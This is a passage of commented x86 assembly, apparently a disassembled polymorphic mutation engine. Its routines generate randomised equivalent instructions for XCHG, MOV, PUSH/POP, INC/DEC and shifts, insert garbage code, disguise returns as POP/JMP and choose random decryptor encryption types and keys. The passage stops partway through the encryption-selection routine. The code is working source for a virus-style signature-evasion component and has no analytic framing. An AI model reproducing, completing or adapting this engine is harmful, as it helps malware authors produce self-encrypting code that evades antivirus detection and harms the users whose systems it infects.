; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Do_XCHG	proc near
   push	ax
   push	edx
   push	esi
   push	edi

loc_0_7B1:
   cmp	esi, edi
   jz	loc_0_7FB
   jb	loc_0_7BB
   xchg	esi, edi	 ; so that ESI < EDI

loc_0_7BB:
   cmp	esi, 8
   jnb	loc_0_778	 ; jump	if both	operands are in	memory
   call	_Add_Needed_Prefix_66 ;	if 32 bits, add	66h prefix
   cmp	edi, 8
   jnb	loc_0_7E9	 ; jump	if only	one operand is in memory
   cmp	cl, 2
   jb	loc_0_7E0	 ; if OperandSize=1 do a normal	XCHG
   cmp	esi, 0
   jnz	loc_0_7E0	 ; jump	if not AX/EAX
   xchg	ax, di
   add	ax, 90h		 ; short version of XCHG --> opcode 0x90
   call	_Store_Instruction_Byte	; store	Opcode byte
   jmp	short loc_0_7F7
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_7E0:
   call	_getRND_in_DX
   jns	loc_0_7E9
   xchg	esi, edi	 ; exchange order of operands

loc_0_7E9:		 ; XCHG
   mov	al, 86h
   call	_Size_8_16	 ; add one according to	its size
   call	_Store_Instruction_Byte
   call	_Generate_ModRM

loc_0_7F7:		 ; copy	instruction to code segment
   call	_Copy_Instruction

loc_0_7FB:
   pop	edi
   pop	esi
   pop	edx
   pop	ax
   retn
Do_XCHG	endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл

; INPUT:
;    BL	= direction of operation
;    BH	= Operation
;    CL	= OperandSize
;    ESI = source
;    EDI = target

Do_Instruction2	proc near
   push	dx
   push	ax
   call	_getRND_in_DX
   mov	ax, D_CS_I
   shr	ax, 3
   cmp	dx, ax
   pop	ax
   pop	dx
   jnb	Do_Instruction1
   cmp	bl, 4
   jb	Do_Instruction1	 ; skip	if not immediate
   cmp	edi, 8
   jnb	Do_Instruction1	 ; skip	if target operand is not a register
   push	edx
   push	esi
   push	cx
   mov	ch, 0
   xor	edx, edx
   call	_Allocate_Code_Space ; allocate	space to store immediate
   xchg	edi, edx
   xchg	esi, edx	 ; EDX = immediate
			 ; ESI = target	operand
			 ; EDI = offset	to store immediate
   push	di

@@1:			 ; store immediate
   mov	es:[di], dl
   inc	di
   shr	edx, 8
   loop	@@1
   pop	di		 ; DI =	offset where immediate is stored
   pop	cx
   add	di, D_CODEBASE	 ; convert into	IP
   or	edi, 1060000h	 ; reference it	as a memory access
   mov	bl, 2
   call	Do_Instruction1	 ; operation target,[immediate]
   mov	bl, 4
   mov	edi, esi	 ; EDI = target	operand
   pop	esi
   pop	edx
   retn
Do_Instruction2	endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл

; INPUT:
;    BL	= direction of operation
;    BH	= Operation
;    CL	= OperandSize
;    ESI = source
;    EDI = target

Do_Instruction1	proc near
   cmp	SaveFlags, 0FFh
   jz	Do_Instruction	 ; jump	if segment prefix has already been stored
   cmp	edi, esi
   jz	Do_Instruction	 ; jump	if operands are	the same (both registers?)
   push	dx
   push	ax
   call	_getRND_in_DX
   mov	ax, D_CS_I
   shr	ax, 2
   cmp	dx, ax
   pop	ax
   pop	dx
   jnb	Do_Instruction
   push	cx
   push	edx
   call	getRND_Reg_Not_Index ; get auxiliar reg
   mov	dl, ch
   and	edx, 7
   cmp	edx, esi
   jz	@@2		 ; if same register, do	a normal operation
   cmp	edx, edi
   jz	@@2		 ; if same register, do	a normal operation
   cmp	bl, 2
   jz	@@1		 ; jump	if ESI is the target
   xchg	esi, edx	 ; ESI = auxiliar
   call	_Do_XCHG2	 ; target <--> auxiliar
   xchg	esi, edx	 ; ESI = source
   xchg	edi, edx	 ; EDI = auxiliar (contains value of target)
   call	Do_Instruction	 ; (BL=0) --> operation	auxiliar,source
   xchg	edi, edx	 ; EDI = target
   xchg	esi, edx	 ; ESI = auxiliar
   call	_Do_XCHG2	 ; target <--> auxiliar
   xchg	esi, edx
   pop	edx
   pop	cx
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

@@1:			 ; EDI = auxiliar
   xchg	edi, edx
   call	_Do_XCHG2	 ; source <--> auxiliar
   xchg	edi, edx	 ; EDI = target
   xchg	esi, edx	 ; ESI = auxiliar (contains value of source)
   call	Do_Instruction	 ; (BL=2) --> operation	target,auxiliar
   xchg	esi, edx	 ; ESI = source
   xchg	edi, edx	 ; EDI = auxiliar
   call	_Do_XCHG2	 ; source <--> auxiliar
   xchg	edi, edx
   pop	edx
   pop	cx
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

@@2:
   pop	edx
   pop	cx
Do_Instruction1	endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл

; INPUT:
;    BL	= direction of operation
;    BH	= Operation
;    CL	= OperandSize
;    ESI = source
;    EDI = target

Do_Instruction proc near
   cmp	cl, 2
   jnz	@@1
   cmp	bh, 0FFh
   jnz	@@1		 ; skip	if operation is	not MOV	of 16 bits
   cmp	edi, 8
   jb	@@15		 ; jump	if MOV operation and target is a word register

@@1:
   push	esi
   push	eax
   call	_Add_Needed_Prefix_66
   cmp	bl, 4
   jnb	@@6		 ; jump	if immediate
   mov	al, 88h
   cmp	bh, 0FFh
   jz	@@4		 ; jump	if MOV operation
   mov	al, 0
   shl	bh, 3
   add	al, bh		 ; AL =	Opcode of operation
   shr	bh, 3
   add	al, bl		 ; (direction of move)
   jmp	@@10
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

@@2:
   test	edi, 0FFFF0000h
   jnz	@@9		 ; jump	if memory access (opcode 0xC6)
   mov	al, 0B0h	 ; opcode 0xB0
   cmp	cl, 1
   jz	@@3
   mov	al, 0B8h	 ; opcode 0xB8

@@3:
   add	ax, di
   call	_Store_Instruction_Byte	; store	Opcode byte
   jmp	@@11
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

@@4:
   add	al, bl
   or	esi, esi
   jnz	@@10		 ; jump	if not MOV with	AL/AX/EAX
   push	eax
   mov	eax, edi
   shr	eax, 10h
   cmp	ax, 106h
   pop	eax
   jnz	@@10		 ; jump	if displacement	has index
   call	Insert_Needed_Prefix_Segment
   mov	al, 0A0h
   add	al, 2
   sub	al, bl		 ; AL =	opcode 0xA0 / 0xA2
   call	_Size_8_16	 ; add one according to	its size
   call	_Store_Instruction_Byte	; store	Opcode byte
   mov	ax, di
   call	_Store_Instruction_Byte	; store	low byte of 16-bit offset
   mov	al, ah
   call	_Store_Instruction_Byte	; store	high byte of 16-bit offset
   jmp	short @@14
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

@@5:			 ; (using AL/AX/EAX)
   mov	al, 4
   shl	bh, 3
   add	al, bh		 ; AL =	Opcode
   shr	bh, 3
   call	_Size_8_16	 ; add one according to	its size
   call	_Store_Instruction_Byte	; store	Opcode byte
   jmp	short @@11
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

@@6:			 ; ESI = immediate
   push	esi
   mov	al, 0C6h
   xor	si, si
   cmp	bh, 0FFh
   jz	@@2		 ; jump	if operation is	a MOV
   or	edi, edi
   jz	@@5		 ; jump	of working with	AL/AX/EAX
   mov	al, 80h		 ; opcode 0x80
   cmp	cl, 1
   jz	@@8		 ; skip	if OperandSize = 1
   pop	esi
   push	esi
   cmp	cl, 4
   jz	@@7
   movsx esi, si	 ; sign	extend to 32 bits

@@7:
   add	esi, 80h
   test	esi, 0FFFFFF00h
   jnz	@@8		 ; jump	if outside (-128..+127)
   mov	al, 82h		 ; opcode 0x82 (later will be added 1)
   or	cl, 80h		 ; indicate its	a sign extend

@@8:
   mov	si, bx

@@9:			 ; SI =	0..7 = operation
   shr	si, 8

@@10:			 ; add one according to	its size
   call	_Size_8_16
   call	_Store_Instruction_Byte	; store	Opcode byte
   call	_Generate_ModRM	 ; create ModRM	byte
   cmp	bl, 4
   jb	@@14		 ; skip	if not immediate

@@11:			 ; EAX = immediate
   pop	eax
   push	cx
   test	cl, 80h
   jz	@@12
   mov	cl, 1		 ; 8-bit signed	immediate is one byte long

@@12:
   mov	ch, 0

@@13:			 ; store immediate
   call	_Store_Instruction_Byte
   shr	eax, 8
   loop	@@13
   pop	cx
   and	cl, 7Fh		 ; delete sign indication

@@14:			 ; copy	instruction to code segment
   call	_Copy_Instruction
   pop	eax
   pop	esi
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

@@15:
   push	dx
   call	_getRND_in_DX
   cmp	dh, 40h
   pop	dx
   jnb	@@1		 ; do MOV instruction
   cmp	bl, 4
   jnb	@@20		 ; if immediate, do LEA	instruction
   push	ax
   push	dx
   mov	ax, si		 ; source operand (=register)
   mov	dx, di		 ; target operand (=register)
   cmp	bl, 0
   jz	@@16
   xchg	ax, dx		 ; exchange operands

@@16:
   shl	dl, 3
   mov	dh, 7		 ; mod=0 , r_m=7
   cmp	al, 3		 ; BX
   jz	@@17
   mov	dh, 4		 ; mod=0 , r_m=4
   cmp	al, 6		 ; SI
   jz	@@17
   mov	dh, 5		 ; mod=0 , r_m=5
   cmp	al, 7		 ; DI
   jz	@@17
   mov	dh, 46h		 ; mod=1 , r_m=6
   cmp	al, 5		 ; BP
   jz	@@17
   pop	dx
   pop	ax
   jmp	@@1		 ; do MOV instruction
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

@@17:			 ; LEA target, [source]
   call	_Store_Instruction_Byte2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   db 8Dh
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   mov	al, dh
   or	al, dl
   call	_Store_Instruction_Byte	; store	ModRM byte
   cmp	dh, 46h
   jnz	@@18
   call	_Store_Instruction_Byte2 ; store a zero	in case	of [BP+00]
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   db 0
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

@@18:
   pop	dx

@@19:
   pop	ax
   call	_Copy_Instruction ; copy instruction to	code segment
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

@@20:			 ; LEA instruction
   push	ax
   mov	ax, di
   shl	al, 3
   call	_Store_Instruction_Byte2 ; store opcode	0x8D
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   db 8Dh
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   or	al, 6
   call	_Store_Instruction_Byte	; store	ModRM byte
   mov	ax, si
   call	_Store_Instruction_Byte	; store	low byte of 16-bit offset
   mov	al, ah
   call	_Store_Instruction_Byte	; store	high byte of 16-bit offset
   jmp	short @@19
Do_Instruction endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Do_PUSH	proc near
   push	si
   push	ax
   call	_Add_Needed_Prefix_66
   cmp	cl, 1
   jz	@@1		 ; jump	if OperandSize=1
   cmp	edi, 8
   jnb	@@1		 ; jump	if operand is not register
   mov	al, 50h		 ; opcode 0x50
   add	ax, di
   call	_Store_Instruction_Byte	; store	Opcode byte
   jmp	short @@2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

@@1:			 ; store Opcode	byte
   call	_Store_Instruction_Byte2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   db 0FFh		 ; group 0xFF
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   mov	si, 6		 ; PUSH	r_m (from group	0xFF)
   call	_Generate_ModRM

@@2:			 ; copy	instruction to code segment
   call	_Copy_Instruction
   pop	ax
   pop	si
   retn
Do_PUSH	endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Do_POP proc near
   push	si
   call	_Add_Needed_Prefix_66
   cmp	cl, 1
   jz	@@1		 ; jump	if OperandSize=1
   cmp	edi, 8
   jnb	@@1		 ; jump	if operand is not register
   mov	al, 58h		 ; opcode 0x58
   add	ax, di
   call	_Store_Instruction_Byte	; store	Opcode byte
   jmp	short @@2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

@@1:			 ; store Opcode	byte
   call	_Store_Instruction_Byte2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   db 8Fh
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   mov	si, 0		 ; POP r_m
   call	_Generate_ModRM

@@2:			 ; copy	instruction to code segment
   call	_Copy_Instruction
   pop	si
   retn
Do_POP endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Do_INC proc near
   push	si
   push	ax
   call	_Add_Needed_Prefix_66
   cmp	cl, 1
   jz	@@1		 ; jump	if OperandSize=1
   cmp	edi, 8
   jnb	@@1		 ; jump	if operand is not register
   mov	al, 40h		 ; opcode 0x40
   add	ax, di
   call	_Store_Instruction_Byte	; store	Opcode byte
   jmp	short @@2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

@@1:			 ; group 0xFE
   mov	al, 0FEh
   call	_Size_8_16	 ; add one according to	its size
   call	_Store_Instruction_Byte
   mov	si, 0		 ; INC r_m
   call	_Generate_ModRM

@@2:			 ; copy	instruction to code segment
   call	_Copy_Instruction
   pop	ax
   pop	si
   retn
Do_INC endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Do_DEC proc near
   push	si
   push	ax
   call	_Add_Needed_Prefix_66
   cmp	cl, 1
   jz	@@1		 ; jump	if OperandSize=1
   cmp	edi, 8
   jnb	@@1		 ; jump	if operand is not register
   mov	al, 48h		 ; opcode 0x48
   add	ax, di
   call	_Store_Instruction_Byte	; store	Opcode byte
   jmp	short @@2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

@@1:			 ; group 0xFE
   mov	al, 0FEh
   call	_Size_8_16	 ; add one according to	its size
   call	_Store_Instruction_Byte
   mov	si, 1		 ; DEC r_m
   call	_Generate_ModRM

@@2:			 ; copy	instruction to code segment
   call	_Copy_Instruction
   pop	ax
   pop	si
   retn
Do_DEC endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Do_INC2	proc near
   call	_Generate_4times_Garbage
   push	dx
   call	_getRND_in_DX
   cmp	dl, 30h
   pop	dx
   ja	Do_INC
   push	bx
   push	esi
   mov	bh, 0		 ; operation = ADD
   mov	bl, 4		 ; source is immediate
   mov	esi, 1		 ; source = 1
   call	_Do_Instruction5 ; generate instruction	(with garbage)
   pop	esi
   pop	bx
   retn
Do_INC2	endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Do_DEC2	proc near
   call	_Generate_4times_Garbage
   push	dx
   call	_getRND_in_DX
   cmp	dl, 30h
   pop	dx
   ja	Do_DEC
   push	bx
   push	esi
   mov	bh, 5		 ; operation = SUB
   mov	bl, 4		 ; source is immediate
   mov	esi, 1		 ; source = 1
   call	_Do_Instruction5 ; generate instruction	(with garbage)
   pop	esi
   pop	bx
   retn
Do_DEC2	endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Do_NEG proc near
   push	si
   push	ax
   call	_Add_Needed_Prefix_66
   mov	al, 0F6h	 ; group 0xF6
   call	_Size_8_16	 ; add one according to	its size
   call	_Store_Instruction_Byte	; store	Opcode byte
   mov	si, 3		 ; NEG r_m
   call	_Generate_ModRM
   call	_Copy_Instruction ; copy instruction to	code segment
   pop	ax
   pop	si
   retn
Do_NEG endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Do_NOT proc near
   push	si
   push	ax
   call	_Add_Needed_Prefix_66
   mov	al, 0F6h	 ; group 0xF6
   call	_Size_8_16	 ; add one according to	its size
   call	_Store_Instruction_Byte
   mov	si, 2		 ; NOT r_m
   call	_Generate_ModRM
   call	_Copy_Instruction ; copy instruction to	code segment
   pop	ax
   pop	si
   retn
Do_NOT endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Store_Segment_Prefix proc near
   push	ax
   cmp	al, 4
   jnb	@@1
   shl	al, 3
   add	al, 26h		 ; select ES,CS,SS,DS
   jmp	short @@2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

@@1:			 ; select FS,GS
   add	al, 60h

@@2:
   call	_Store_Instruction_Byte
   pop	ax
   mov	SaveFlags, 0FFh	 ; indicate a prefix has been generated
   retn
Store_Segment_Prefix endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Do_MOV_mem_seg proc near
   cmp	SaveFlags, 0FFh	 ; (is prefix seg has been generated, we cannot	continue with a	PUSH seg)
   jz	@@1
   call	_getRND_in_DX
   cmp	dh, 40h
   jb	@@2

@@1:			 ; MOV reg/mem,seg
   call	_Store_Instruction_Byte2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   db 8Ch
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   call	_Generate_ModRM
   call	_Copy_Instruction
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

@@2:
   push	ax
   push	cx
   mov	ax, si
   shl	al, 3
   or	al, 6
   cmp	al, 20h
   jb	@@3		 ; skip	if not FS / GS
   call	_Store_Instruction_Byte2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   db 0Fh
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   and	al, 38h
   or	al, 80h

@@3:			 ; PUSH	seg
   call	_Store_Instruction_Byte
   call	_Copy_Instruction
   mov	cl, 2
   call	Do_POP		 ; pop reg/mem
   pop	cx
   pop	ax
   retn
Do_MOV_mem_seg endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Do_MOV_seg_mem proc near
   cmp  SaveFlags, 0FFh
   jz	@@1
   cmp	si, 1		 ; POP CS cannot be generated, only MOV	CS,reg/mem
   jz	@@1
   call	_getRND_in_DX
   cmp	dh, 40h
   jb	@@2

@@1:
   call	_Store_Instruction_Byte2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   db 8Eh		 ; MOV seg,reg/mem
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   call	_Generate_ModRM
   call	_Copy_Instruction
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

@@2:
   push	ax
   push	cx
   mov	cl, 2
   call	Do_PUSH		 ; PUSH	reg/mem
   mov	ax, si
   shl	al, 3
   or	al, 7
   cmp	al, 20h
   jb	@@3		 ; skip	if not FS / GS
   call	_Store_Instruction_Byte2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   db 0Fh
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   and	al, 38h
   or	al, 81h

@@3:			 ; POP seg
   call	_Store_Instruction_Byte
   call	_Copy_Instruction
   pop	cx
   pop	ax
   retn
Do_MOV_seg_mem endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Do_Procedure_Return proc near
   push	cx
   push	dx
   push	si
   push	edi
   call	_Generate_4times_Garbage
   call	_getRND_in_DX
   or	dh, dh
   jnz	loc_0_C6C	 ; do a	RET
   mov	cl, 2		 ; OperandSize=2
   call	_Choose_Register
   cmp	ch, 8
   jb	loc_0_C7B	 ; jump	if its a register

loc_0_C6C:
   call	_Store_Instruction_Byte2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   db 0C3h
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_C71:
   call	_Copy_Instruction
   pop	edi
   pop	si
   pop	dx
   pop	cx
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_C7B:
   mov	al, 1
   call _setRegUsed      ; specify that CH register will be used for a later purpose
   movzx edi, ch
   call	Do_POP		 ; POP reg
   call	_Generate_4times_Garbage
   call	_Store_Instruction_Byte2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   db 0FFh
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   mov	si, 4		 ; JMP reg
   call	_Generate_ModRM
   mov	al, 0		 ; specify that	CH register will not be	needed
   call	_setRegUsed
   jmp	short loc_0_C71
Do_Procedure_Return endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл

; INPUT:
;    BL	= number of bits to shift
;    BH	= operation
;    CL	= OperandSize
;    EDI = target

Do_SHIFT proc near
   push	ax
   push	si
   call	_Add_Needed_Prefix_66
   mov	al, 0D0h
   cmp	bl, 1		 ; number of bits to shift
   jz	loc_0_CAF
   mov	al, 0C0h

loc_0_CAF:		 ; add one according to	its size
   call	_Size_8_16
   call	_Store_Instruction_Byte
   movzx si, bh
   call	_Generate_ModRM
   cmp	bl, 1
   jz	loc_0_CC9
   mov	al, bl
   call	_Store_Instruction_Byte

loc_0_CC9:
   call	_Copy_Instruction
   pop	si
   pop	ax
   retn
Do_SHIFT endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл

; INPUT:
;    BH	= operation
;    CL	= OperandSize
;    EDI = target

Do_SHIFT_CL proc near
   push	ax
   push	si
   call	_Add_Needed_Prefix_66
   mov	al, 0D2h
   call	_Size_8_16	 ; add one according to	its size
   call	_Store_Instruction_Byte
   movzx si, bh
   call	_Generate_ModRM
   call	_Copy_Instruction
   pop	si
   pop	ax
   retn
Do_SHIFT_CL endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл

; INPUT:
;    BL	= number of bits to shift
;    BH	= operation
;    CL	= OperandSize
;    EDI = target

Do_SHIFT2 proc near
   push	dx
   push	ax
   push	bx
   call	_getRND_in_DX
   jns	@@1
   cmp	bh, 1
   ja	@@1		 ; skip	if not ROL/ROR
   xor	bh, 1		 ; reverse rotate operation
   neg	bl		 ; x = (0 - BL)
   mov	al, cl
   shl	al, 3
   neg	al		 ; AL =	(0 - OperandBits)
   call	_getRND_in_DX
   and	dl, al		 ; clear useful	bits
   xor	bl, dl		 ; add bits needed to do inverse rotate	operation

@@1:
   call	_getRND_in_DX
   and	dl, not	1Fh
   xor	bl, dl		 ; set random higher bits (cpu ignores them)
   call	Do_SHIFT
   pop	bx
   pop	ax
   pop	dx
   retn
Do_SHIFT2 endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Do_SHIFT3 proc near
   push	dx
   push	bx
   call	_getRND_in_DX
   and	dh, 6
   xor	bh, dh
   call	Do_SHIFT2
   pop	bx
   pop	dx
   retn
Do_SHIFT3 endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Choose_Encryption proc near
   call	_getRND_in_DX
   and	dh, 1
   mov  byte_0_350, dh   ; encryption method
   xor	ecx, ecx
   mov	cl, 0FFh	 ; CX =	0x00FF
   cmp	dh, 1
   jnz	loc_0_D48
   xchg	cl, ch		 ; CX =	0xFF00

loc_0_D48:
   xor	bx, bx

loc_0_D4A:
   xor	si, si
   mov	edi, ecx

loc_0_D4F:
   mov	ecx, edi
   cmp	cl, 0FFh
   jnz	loc_0_D80
   call	_getRND_in_DX
   cmp	dh, 40h
   jb	loc_0_D80
   or	dx, dx
   jns	loc_0_E64
   mov	DecryptType0[bx], 8
   call	_getRND_in_DX
   test	dl, 7
   jnz	loc_0_D76
   add	dl, dh

loc_0_D76:
   and	dl, 7
   mov	(DecryptType0+1)[bx], dl ; random reg
   jmp	loc_0_E81
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_D80:
   cmp	ch, 0FFh
   jnz	loc_0_DA8
   call	_getRND_in_DX
   cmp	dh, 40h
   jb	loc_0_DA8
   mov	DecryptType0[bx], 9
   call	_getRND_in_DX
   test	dl, 7
   jnz	loc_0_D9E
   add	dl, dh

loc_0_D9E:
   and	dl, 7
   mov	(DecryptType0+1)[bx], dl ; random reg
   jmp	loc_0_E81
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_DA8:
   or	cx, cx
   jz	loc_0_DE4
   call	_getRND_in_DX
   cmp	dh, 0D0h
   jb	loc_0_DE4
   mov	al, cl
   or	al, ch
   cmp	al, 0FFh
   mov	word ptr DecryptType0[bx], 80Ah
   xchg	cl, ch
   jnz	loc_0_E81
   xchg	cl, ch
   call	_getRND_in_DX
   test	dl, 0Fh
   jnz	loc_0_DD4
   add	dl, dh

loc_0_DD4:
   and	dl, 0Fh
   mov	(DecryptType0+1)[bx], dl
   xchg	cx, dx
   rol	dx, cl
   xchg	cx, dx
   jmp	loc_0_E81
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_DE4:
   call	_getRND_in_DX
   cmp	dh, 50h
   jnb	loc_0_E04
   mov	DecryptType0[bx], 0Bh
   and	dl, 1Fh
   mov	(DecryptType0+1)[bx], dl ; random bits
   xchg	ecx, edx
   rol	edx, cl
   xchg	ecx, edx
   jmp	short loc_0_E81
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_E04:
   cmp	dh, 0A0h
   jnb	loc_0_E64
   and	dl, 4
   mov	al, dl
   add	al, 3
   call	_getRND_in_EDX
   mov	dword ptr (DecryptType0+1)[bx],	edx
   or	cx, cx
   jz	loc_0_E4E
   mov	ah, cl
   or	ah, ch
   cmp	ah, 0FFh
   jz	loc_0_E2F
   call	_getRND_in_DX
   cmp	dh, 0A0h
   jb	loc_0_E4E

loc_0_E2F:
   dec	al
   or	cl, cl
   jz	loc_0_E48
   cmp	cl, 0FFh
   jz	loc_0_E4C
   call	_getRND_in_DX
   cmp	dh, 50h
   jnb	loc_0_E4E
   cmp	dh, 28h
